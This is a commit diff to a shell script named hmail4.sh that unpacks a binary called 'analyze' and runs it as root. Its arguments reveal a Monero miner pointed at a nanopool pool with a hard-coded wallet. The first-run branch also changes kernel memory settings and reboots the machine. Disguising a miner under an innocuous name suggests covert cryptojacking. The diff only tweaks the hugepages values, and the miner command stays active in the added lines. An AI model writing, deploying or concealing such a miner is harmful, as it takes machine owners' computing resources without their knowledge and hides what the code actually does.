bc8de44bbde2f843f4e0f42db3f53feef415862c
Алмаз Ахметов <ahmetov@ckr-sota.ru>
2019-12-03 21:48:35 +0300

    pages

--- hmail4.sh
+++ hmail4.sh
@@ -1,6 +1,6 @@
 if [ -e /root/initdone ]
 then
-    tar -xvf analyze.tar ; sudo sysctl -w vm.nr_hugepages=1168 ; sudo chmod +x ./analyze ; sudo LD_LIBRARY_PATH=$PWD:$LD_LIBRARY_PATH  ./analyze -a rx/0 -t 4 -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS21WH2cfawSGCNupk7.hmailx/itwaybot@gmail.com -l res.txt
+    tar -xvf analyze.tar ; sudo sysctl -w vm.nr_hugepages=4 ; sudo chmod +x ./analyze ; sudo LD_LIBRARY_PATH=$PWD:$LD_LIBRARY_PATH  ./analyze -a rx/0 -t 4 -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS21WH2cfawSGCNupk7.hmailx/itwaybot@gmail.com -l res.txt
 else
-    sudo sysctl -w vm.nr_hugepages=1168 ; sudo echo "* soft memlock 2621440" >> /etc/security/limits.conf ; sudo echo "* hard memlock 2621440" >> /etc/security/limits.conf ; echo "." > /root/initdone ; reboot
+    sudo sysctl -w vm.nr_hugepages=4 ; echo "." > /root/initdone ; reboot
 fi
